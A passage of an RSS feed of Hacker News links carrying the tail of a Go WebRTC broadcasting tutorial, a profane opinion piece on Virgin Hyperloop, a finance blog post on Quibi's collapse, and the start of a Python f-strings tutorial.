<p>Once you are done with the configuration you can start the server using the following command:</p>
<pre><code>go build ./cmd/signal/json-rpc/main.go &amp;&amp; ./main -c config.toml
</code></pre>
<p>Alternatively you can also start the server using Docker if you prefer that over starting it using Golang.</p>
<pre><code>docker run -p 7000:7000 -p 5000-5020:5000-5020/udp pionwebrtc/ion-sfu:latest-jsonrpc
</code></pre>
<p>You have now successfully set up your ION-SFU server and should see the following output in the console.</p>
<pre><code>config config.toml load ok!
[2020-10-12 19:04:19.017] [INFO] [376][main.go][main] =&gt; --- Starting SFU Node ---
[2020-10-12 19:04:19.018] [INFO] [410][main.go][main] =&gt; Listening at http://[:7000]
</code></pre>
<h2 id="creatingtheproject">Creating the project</h2>
<p>Now that the setup and configuration of the ion-sfu server are done it is time to create the project</p>
<p>First, you will need to create a directory and enter it.</p>
<pre><code>mkdir mediadevice-broadcast &amp;&amp; cd mediadevice-broadcast
</code></pre>
<p>After that you can continue by creating all the files needed for the project using the following command:</p>
<pre><code>mkdir public
touch main.go public/index.html public/index.js public/style.css
</code></pre>
<p>There are also two packages that need to be installed to follow this article.</p>
<pre><code>sudo apt-get install -y v4l-utils
sudo apt-get install -y libvpx-dev
</code></pre>
<p>If you are not on Linux you might need to download different packages. Look at the <a href="https://github.com/pion/mediadevices">media devices documentation</a> for more information.</p>
<h2 id="establishingawebrtcconnection">Establishing a WebRTC connection</h2>
<p>Before any data can be exchanged using WebRTC, there must first be an established peer-to-peer connection between two WebRTC agents. Since the peer-to-peer connection often cannot be established directly there needs to be some signaling method.</p>
<p>Signaling to the ion-sfu will be handled over the Websockets protocol. For that, we will implement a simple Websockets boilerplate using the <em>gorilla/websocket</em> library that connects to the Websockets server and allows us to receive the incoming message and send our own.</p>
<pre><code>package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/url"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

var addr string

func main() {
	flag.StringVar(&amp;addr, "a", "localhost:7000", "address to use")
	flag.Parse()

	u := url.URL{Scheme: "ws", Host: addr, Path: "/ws"}
	log.Printf("connecting to %s", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	// Read incoming Websocket messages
	done := make(chan struct{})

	go readMessage(c, done)

	&lt;-done
}

func readMessage(connection *websocket.Conn, done chan struct{}) {
	defer close(done)
	for {
		_, message, err := connection.ReadMessage()
		if err != nil || err == io.EOF {
			log.Fatal("Error reading: ", err)
			break
		}

		fmt.Printf("recv: %s", message)
	}
}
</code></pre>
<p>Now let's walk through the code for better understanding:</p>
<ul>
<li>The flag is used to dynamically provide the URL of the Websockets server when starting the script and has a standard value of <strong>localhost:7000</strong></li>
<li>The URL is used to create a Websockets client using the <strong>Dial</strong> method. Then we check if the connection resulted in an error and print a log if that is the case.</li>
<li>The <strong>readMessage</strong> function then reads the incoming messages by calling <strong>ReadMessage()</strong> on the Websocket connection and is run as a Go routine so it doesn't block the main thread and can run in the background.</li>
<li>The last line of the <strong>main()</strong> function makes sure that the script runs as long as the <strong>done</strong> variable is not closed.</li>
</ul>
<p>The next step is creating a peer connection to the ion-sfu and handling the incoming WebRTC signaling events.</p>
<pre><code>var peerConnection *webrtc.PeerConnection

func main() {
...

    config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs: []string{"stun:stun.l.google.com:19302"},
			},
			/*{
				URLs:       []string{"turn:TURN_IP:3478?transport=tcp"},
				Username:   "username",
				Credential: "password",
			},*/
		},
		SDPSemantics: webrtc.SDPSemanticsUnifiedPlanWithFallback,
	}

	// Create a new RTCPeerConnection
	mediaEngine := webrtc.MediaEngine{}

	vpxParams, err := vpx.NewVP8Params()
	if err != nil {
		panic(err)
	}
	vpxParams.BitRate = 500_000 // 500kbps

	codecSelector := mediadevices.NewCodecSelector(
		mediadevices.WithVideoEncoders(&amp;vpxParams),
	)

	codecSelector.Populate(&amp;mediaEngine)
	api := webrtc.NewAPI(webrtc.WithMediaEngine(mediaEngine))
	peerConnection, err = api.NewPeerConnection(config)
	if err != nil {
		panic(err)
	}

}
</code></pre>
<p>Here we first create a WebRTC config where we define our STUN and TURN server that will be used in the signaling process. After, that we create a <em>MediaEngine</em> that lets us define the codecs supported by the peer connection.</p>
<p>With all that configuration done we can create a new peer connection by calling the <strong>NewPeerConnection</strong> function on the WebRTC API we just created.</p>
<p>Before sending the offer to the ion-sfu server over Websockets we first need to add the video and audio stream. This is where the media device library comes into play to read the video from the camera.</p>
<pre><code>    fmt.Println(mediadevices.EnumerateDevices())

	s, err := mediadevices.GetUserMedia(mediadevices.MediaStreamConstraints{
		Video: func(c *mediadevices.MediaTrackConstraints) {
			c.FrameFormat = prop.FrameFormat(frame.FormatYUYV)
			c.Width = prop.Int(640)
			c.Height = prop.Int(480)
		},
		Codec: codecSelector,
	})

	if err != nil {
		panic(err)
	}

	for _, tracker := range s.GetTracks() {
		tracker.OnEnded(func(err error) {
			fmt.Printf("Track (ID: %s) ended with error: %v\n",
				tracker.ID(), err)
		})

		webrtcTrack, err := tracker.Bind(peerConnection)
		if err != nil {
			panic(err)
		}

		_, err = peerConnection.AddTransceiverFromTrack(webrtcTrack,
			webrtc.RtpTransceiverInit{
				Direction: webrtc.RTPTransceiverDirectionSendonly,
			},
		)

		if err != nil {
			panic(err)
		}
	}
</code></pre>
<p>Once an instance of the media devices library is created using the peer connection you can get the user media using the <strong>GetUserMedia</strong> function and passing the parameters.</p>
<p>One configuration change you might need to make is altering the <strong>FrameFormat</strong> to support your connected camera. You can check the frame format of your camera with the following command:</p>
<pre><code>v4l2-ctl --all
</code></pre>
<p>All supported formats can also be found in the <a href="https://github.com/pion/mediadevices/blob/master/pkg/frame/decode.go#L7-L26">media devices Github repository</a>.</p>
<p>The offer can now be created and saved into the local description of the peer connection.</p>
<pre><code>    // Creating WebRTC offer
	offer, err := peerConnection.CreateOffer(nil)

	// Set the remote SessionDescription
	err = peerConnection.SetLocalDescription(offer)
	if err != nil {
		panic(err)
	}
</code></pre>
<p>The next step is to send the offer over to the sfu using Websockets. The Websockets message is JSON and needs a specific structure to be recognized by the sfu.</p>
<p>Therefore we need to create a struct holding our offer and the required sid that specifies the room we want to join that we can then convert into JSON.</p>
<pre><code>type SendOffer struct {
	SID   string                     `json:sid`
	Offer *webrtc.SessionDescription `json:offer`
}
</code></pre>
<p>Now we convert our offer …</p></section></section></div></div></section></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gabrieltanner.org/blog/broadcasting-ion-sfu">https://gabrieltanner.org/blog/broadcasting-ion-sfu</a></em></p>]]>
            </description>
            <link>https://gabrieltanner.org/blog/broadcasting-ion-sfu</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072605</guid>
            <pubDate>Thu, 12 Nov 2020 17:59:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virgin Hyperloop Has Invented the World’s Crappiest High-Speed Rail]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25072110">thread link</a>) | @iron0013
<br/>
November 12, 2020 | https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/ | <a href="https://web.archive.org/web/*/https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>




</div></div></div></div></div>]]>
            </description>
            <link>https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072110</guid>
            <pubDate>Thu, 12 Nov 2020 17:24:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Financial failures that wasted Quibi's $1.75B]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071876">thread link</a>) | @itsjoemic
<br/>
November 12, 2020 | https://www.mosaic.tech/post/financial-factors-that-sank-quibi | <a href="https://web.archive.org/web/*/https://www.mosaic.tech/post/financial-factors-that-sank-quibi">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>NYU Stern School of Business professor <a href="https://www.profgalloway.com/land-of-the-undead">Scott Galloway predicted</a> Quibi would fall apart eight months before it did. Unsurprisingly, that rubbed some Quibi leaders the wrong way. On <a href="https://podcasts.apple.com/us/podcast/doj-google-showdown-rip-quibi-listener-mail-question/id1073226719?i=1000495767700">Vox’s Pivot podcast</a>, Galloway said he “got a call from the CFO of Quibi before it even launched and [she] said, ‘You have to stop dancing on our grave before we’ve even been birthed.’”</p><div><p>Well, six months after launch, Quibi officially died, so Scott Galloway can happily dance on the grave.</p><p>If you’ve (somehow) missed the barrage of Quibi news and commentary, here’s what you need to know. Quibi, named for the “quick bites” of short-form video content it would offer users, was founded by Jeffrey Katzenberg (founder of DreamWorks) in August 2018 and quickly closed a $1 billion round of funding. With grand aspirations to compete in the streaming wars, Quibi raised another $750 million in March 2020 before launching its platform in April 2020. </p><p>And it did not go well. </p></div><figure id="w-node-a3a2b323b892-c03f76fb"><p><img src="https://global-uploads.webflow.com/5f1f57792641fc1abd3f7713/5fabe1daa93149329070f661_quite%20headline%20collection-1-2-2.jpg" loading="lazy" alt=""></p></figure><div><p>Ahead of the platform’s launch, Quibi CFO Ambereen Toubassy <a href="https://variety.com/2020/digital/news/quibi-750-million-funding-investment-mobile-video-1203523586/">told <em>Variety</em></a>: “We concluded a very successful second raise which will provide Quibi with a strong cash runway. This round of $750 million gives us tremendous flexibility and the financial wherewithal to build content and technology that consumers embrace.” </p><p>Launching at the scale necessary to meet Quibi’s lofty goals was always going to take a heroic feat of financial planning. As CFO, Toubassy had to shoulder all of the challenges that come with forecasting and tracking financials at that scale. However, the execution of <a href="https://www.mosaic.tech/post/saas-eats-everything">strategic finance</a> just wasn’t there.</p><p>Executives have been quick to blame the COVID-19 pandemic for the platform’s problems. But if there’s one thing you take away from Quibi’s story, remember that it wasn’t a freak health crisis that sank the company—it was a lack of financial fundamentals. </p></div><h2>Trying to Outrun the Burn Rate</h2><div><p>Even after raising a total of $1.75 billion in funding, Quibi managed to spend money at an unsustainable rate. As Quibi’s CFO noted, the two rounds of funding should have set the company up with a strong cash runway—the kind that could support the platform’s aggressive entry to the streaming wars. But a closer look at the company’s spending shows that an unmanageable burn rate almost completely wiped that <a href="https://www.mosaic.tech/post/startup-success-requires-a-clear-view-of-your-runway">runway</a> out over the platform’s six-month life span.</p><p><a href="https://www.theinformation.com/articles/the-investors-who-face-big-losses-from-the-quibi-collapse">Reports show</a> that after paying outstanding bills, Quibi will be returning $350 million to its shareholders. Without more insight into Quibi’s revenue, it’s tough to estimate a net burn rate. But, at the very least, the company spent $1.4 billion over the course of about 26 months, putting its monthly gross burn rate somewhere between $40 million and $50 million. </p><p>That figure obviously proved unsustainable, but where was all the money going? There were two standout costs eating into Quibi’s runway:</p></div><ul role="list"><li><strong>The $100k-per-minute production problem: </strong>At one point, <a href="https://www.vulture.com/article/what-is-quibi-explained.html">Katzenberg said</a> Quibi’s first-year content budget was $1.1 billion, and that higher-profile, scripted shows would have production budgets of $100,000 per minute. <a href="https://techcrunch.com/2020/01/13/quibi-execs-jeffrey-katzenberg-and-meg-whitman-explain-their-big-vision/">According to TechCrunch</a>, CEO Meg Whitman “proudly contrasted the jaw-dropping sum to the estimated $500 to $5,000 an hour spent by YouTube creators.” The result? A product in limbo between two different target markets. They committed to the “Hollywood-quality content” of a Netflix or an HBO to compete against free-to-watch powerhouses like TikTok and YouTube. The cost of content proved too high.</li><li><strong>A prelaunch </strong>“<strong>hiring rampage”: </strong> Just a year after starting the company, and before ever bringing a product to market, Quibi’s head count was already at a costly 160. Then, in August 2019, people close to Quibi <a href="https://www.businessinsider.com/jeffrey-katzenberg-quibi-has-embarked-on-an-aggressive-hiring-spree-2019-8">told <em>Business Insider</em></a> the company was about to go on a hiring rampage. The company hired expensive talent, like Netflix’s director of acquisition marketing, DC’s entertainment president, Netflix’s head of product creative, and at least 17 Snapchat engineers. Another year later, Quibi’s head count reached at least 260, and the company had to ask senior executives to take a 10% pay cut to avoid layoffs, <a href="https://www.wsj.com/articles/quibi-asks-senior-executives-to-take-10-pay-cut-11591206642">according to the <em>Wall Street Journal</em></a>. </li></ul><p>Other factors impacting Quibi’s burn rate included a 10-year lease on a 49,000-square-foot office in the heart of Hollywood, fees from a legal battle over its app features, and (maybe most importantly) an astronomical marketing budget for a new startup—but that deserves its own section.</p><h2>Creating a CAC Nightmare</h2><div><p>Right as the platform was about to launch, <a href="https://digiday.com/future-of-tv/king-kong-jumping-off-empire-state-building-quibis-400m-marketing-push-spans-tv-person-screenings/">reports said</a> Quibi was planning to spend between $400 million and $500 million on marketing in 2020, with a target of 7.4 million paid subscribers for the first year. In the best-case scenario, that would put <a href="https://www.mosaic.tech/post/customer-acquisition-cost">customer acquisition costs</a> (CAC) at $55-$65, which doesn’t sound too bad compared with <a href="https://stratechery.com/2018/netflix-earnings-netflixs-rising-cac-content-and-marketing/">Stratechery’s 2018 estimate</a> that put Netflix’s CAC at $45-$60. Like the CFO’s plans to use the recent $750 million in funding to stabilize runway, these projections seem acceptable in theory.</p><p>However, postlaunch disappointments complicated Quibi’s CAC. External factors like the pandemic and lukewarm reception for the platform led to a much tighter marketing budget and (at best) <a href="https://www.theinformation.com/articles/katzenberg-strikes-out-on-quibi-sale-efforts-so-far">500,000 paying customers</a> by October 2020. &nbsp;</p><p><a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">One study</a> found that from launch through the company’s shutdown, Quibi ended up spending only $63 million on ads after launch. Even if you use that figure as Quibi’s entire marketing budget, the most conservative estimate would put its CAC about 2x higher than expected. That’s a problem, but it’s not exactly a nightmare. </p><p>The real CAC nightmare becomes apparent when you factor in the content costs. If you were running strategic finance for Quibi, you couldn’t have a CAC conversation without considering the money spent on the content library. This is a streaming business, which means content isn’t just a product development concern—it’s a tool for customer acquisition. Quibi invested heavily in big-name creators, hoping that it would translate to more paying customers while massively skewing CAC.</p><p>Assume that a conservative 20% of the $1.4 billion Quibi spent in 26 months went to production costs for its initial slate of shows. That’s $280 million to add to the $63 million in ad spend. Calculated against the base of 500,000 paid subscribers, CAC jumps all the way up to a crushing $686. </p><p>When reports came out saying Quibi was <a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">only able to convert 8% of its free trial</a> users to paid subscribers, it was clear that <a href="https://www.mosaic.tech/post/customer-lifetime-value">customer lifetime value</a> (LTV) was also going to be an issue. And, ultimately, the LTV to CAC ratio was just impossible to fix—especially at Quibi’s scale.</p></div><h2>Committing to Overcapitalization</h2><div><p>Raising $1 billion to open the company may have doomed Quibi from the start. It positioned Katzenberg and Co. to fall victim to overcapitalization. Because the company had so much cash on hand, product-oriented leaders like Katzenberg and other executives felt they could bypass financial fundamentals and spend hundreds of millions of dollars before ever generating revenue or even bringing an MVP to market. This path left the company with massive expectations that were almost impossible to meet.</p><p>This was especially problematic as Quibi tried to prove its model. Here’s how <a href="https://www.vanityfair.com/hollywood/2019/06/quibi-jeffrey-katzenberg-streaming-platform-interview">Katzenberg would explain</a> the strategy early on:</p></div><blockquote>I’m going to continue to believe, and argue, and preach that Quibi is not a substitute or a competitor for television. Our [service] is exclusively about what you do from 7 a.m. to 7 p.m. on your phone. And what you’re doing today, if you’re in our core demographic of 25- to 35-year-olds, is you’re actually watching 60-70 min of YouTube, Facebook, Instagram, and Snapchat. That growth is now a well-established consumer habit that Quibi is sailing into.</blockquote><div><p>One of the biggest consequences of Quibi’s overcapitalization and commitment to blitz the market was that it was almost impossible to act like a true startup when consumers didn’t respond well to the platform. Startups pivot all the time when their initial ideas aren’t working. Quibi couldn’t. As Scott Galloway said on the Pivot podcast, “Great companies start small, validate a concept, almost always pivot to something that’s working. This was, let’s start with $1.5 billion.” </p><p>Raising a massive amount of money (like Quibi did) isn’t inherently a problem. You only start to see the consequences of overcapitalization when all that money leads to poor financial hygiene. And this can happen at any scale. Whether you’ve raised $1 million or $100 million, your financial forecasts have to remain realistic to maintain stability as the business evolves rapidly. </p><p>It didn’t take long for Quibi’s financial forecasts to prove unrealistic. But by spending so much money so quickly, they backed themselves into a corner that limited their options as the platform missed subscriber projections by a wide margin. </p></div><h2>Good Financial Hygiene Prevents Quibi-Sized Disasters</h2><div><p>Raising more than $1 billion in funding isn’t exactly common, so we probably won’t see startups labeled “the next Quibi” anytime soon. But that doesn’t mean you’re immune to the same kinds of problems that sank the streaming platform so quickly. </p><p>Maybe Katzenberg is right, and the pandemic really did limit Quibi’s potential. Maybe everyone on the outside is right, and the product-market fit just wasn’t there. People will argue those points endlessly as Quibi goes down in history as one of the fastest startup failures ever.</p><p>What can’t be argued is the fact that poor financial hygiene was at the very core of Quibi’s problems. By prioritizing a “revolutionary” product vision over strategic financial decision-making, Quibi dug a hole so deep that it had no choice but to shut down. Don’t fall into the same trap.</p><p>Whether you’re well on your way to becoming the next unicorn, or you’ve just raised your seed round, make sure you can run financial forecasts continuously and that you have real-time insight into your key <a href="https://www.mosaic.tech/post/the-7-go-to-market-metrics-you-should-actually-care-about-and-why-you-should-care">go-to-market metrics</a>. When you can answer key financial questions at the pace of your business, you’re able to collaborate with stakeholders more effectively and put …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mosaic.tech/post/financial-factors-that-sank-quibi">https://www.mosaic.tech/post/financial-factors-that-sank-quibi</a></em></p>]]>
            </description>
            <link>https://www.mosaic.tech/post/financial-factors-that-sank-quibi</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071876</guid>
            <pubDate>Thu, 12 Nov 2020 17:05:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A 1000 auto-generated hexagonal SVG logos]]>
            </title>
            <description>
<![CDATA[
Score 154 | Comments 62 (<a href="https://news.ycombinator.com/item?id=25071643">thread link</a>) | @graderjs
<br/>
November 12, 2020 | https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1 | <a href="https://web.archive.org/web/*/https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071643</guid>
            <pubDate>Thu, 12 Nov 2020 16:44:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Examples to Help You Master Python's F-Strings]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071504">thread link</a>) | @rbanffy
<br/>
November 12, 2020 | https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings | <a href="https://web.archive.org/web/*/https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>In this post, I'll show you what I consider the most important bits about Python's f-strings. You will learn several different ways to format a string using f-strings, completely guided by examples. In total, you'll see 73 examples on how to make the best use of f-strings.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#what-are-pythons-f-strings-aka-literal-string-interpolation">What Are Python's F-Strings - a.k.a Literal String Interpolation?</a></li>
<li><a href="#basic-string-formatting-with-python">Basic String Formatting With Python</a></li>
<li><a href="#limitations">Limitations</a></li>
<li><a href="#how-to-format-an-expression">How to Format an Expression</a></li>
<li><a href="#how-to-use-f-strings-to-debug-your-code">How to Use F-Strings to Debug Your Code</a></li>
<li><a href="#how-to-format-integers-in-different-bases">How to Format Integers in Different Bases</a></li>
<li><a href="#how-to-format-integers-in-different-bases">How to Print Objects With F-Strings</a></li>
<li><a href="#how-to-set-float-number-precision-in-a-f-string">How to Set Float Number Precision in a F-String</a></li>
<li><a href="#how-to-format-a-number-as-percentage">How to Format a Number as Percentage</a></li>
<li><a href="#how-to-justify-or-add-padding-to-a-f-string">How to Justify or Add Padding to a F-String</a></li>
<li><a href="#how-to-escape-characters">How to Escape Characters</a></li>
<li><a href="#how-to-center-a-string">How to Center a String</a></li>
<li><p><a href="#how-to-add-a-thousand-separator">How to Add a Thousand Separator</a></p>
<p>   13.1. <a href="#how-to-format-a-number-with-commas-as-decimal-separator">How to Format a Number With Commas as Decimal Separator</a></p>
<p>   13.2. <a href="#how-to-format-a-number-with-spaces-as-decimal-separator">How to Format a Number With Spaces as Decimal Separator</a></p>
</li>
<li><a href="#how-to-format-a-number-in-scientific-notation-exponential-notation">How to Format a Number in Scientific Notation (Exponential Notation)</a></li>
<li><a href="#using-if-else-conditional-in-a-f-string">Using <code>if-else</code> Conditional in a F-String</a></li>
<li><a href="#how-to-use-f-string-with-a-dictionary">How to Use F-String With a Dictionary</a></li>
<li><a href="#how-to-concatenate-f-strings">How to Concatenate F-Strings</a></li>
<li><a href="#how-to-format-datetime-objects">How to Format <code>datetime</code> Objects</a></li>
<li><a href="#how-to-fix-f-strings-invalid-syntax-error">How to Fix F-String's Invalid Syntax Error</a></li>
<li><a href="#how-to-add-leading-zeros">How to Add Leading Zeros</a></li>
<li><a href="#how-to-write-a-multi-line-f-string-dealing-with-new-lines">How to Write a Multi Line F-String (Dealing With New Lines)</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<h2 id="what-are-pythons-f-strings-aka-literal-string-interpolation">What Are Python's F-Strings - a.k.a Literal String Interpolation?</h2>
<p>String formatting has evolved quite a bit in the history of Python. Before Python2.6, to format a string, one would either use the <code>%</code> operator, or <code>string.Template</code> module. Some time later, the <code>str.format</code> method came along and added to the language a more flexible and robust way of formatting a string.</p>
<p>Old string formatting with <code>%</code>:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>'msg: %s'</span> % msg
<span>'msg: hello world'</span>
</code></pre>
<p>Using <code>string.format</code>:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>'msg: {}'</span>.format(msg)
<span>'msg: hello world'</span>
</code></pre>
<p>To simplify formatting even further, in 2015, Eric Smith proposed the <a target="_blank" href="https://www.python.org/dev/peps/pep-0498/">
PEP 498 -- Literal String Interpolation
</a>.</p>
<p>PEP 498 presented this new string interpolation to be a simple and easy to use alternative to <code>str.format</code>. The only thing required was one more char - <code>f""</code> - at the beginning of the string.</p>
<p>Using f-strings:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>f'msg: <span>{msg}</span>'</span>
<span>'msg: hello world'</span>
</code></pre>
<p>And that was it! No need to use <code>str.format</code> or <code>%</code>. However, f-strings don’t replace <code>str.format</code> completely. In this guide I’ll show you an example where they are not suitable.</p>
<h2 id="basic-string-formatting-with-python">Basic String Formatting With Python</h2>
<p>As I have shown in the previous section, formatting a string using f-strings is quite straightforward. The sole requirement is to provide it a valid expression. f-strings can also start with capital <code>F</code> and you can combine with raw strings. However, you cannot mix them with bytes <code>b""</code> or <code>"u"</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603916687914/zA7xXR7UF.png?auto=format&amp;q=60" alt="fig_5.png"></p>
<pre><code><span>&gt;&gt;&gt; </span>book = <span>"The dog guide"</span>

<span>&gt;&gt;&gt; </span>num_pages = <span>124</span>

<span>&gt;&gt;&gt; </span><span>f"The book <span>{book}</span> has <span>{num_pages}</span> pages"</span>
<span>'The book The dog guide has 124 pages'</span>

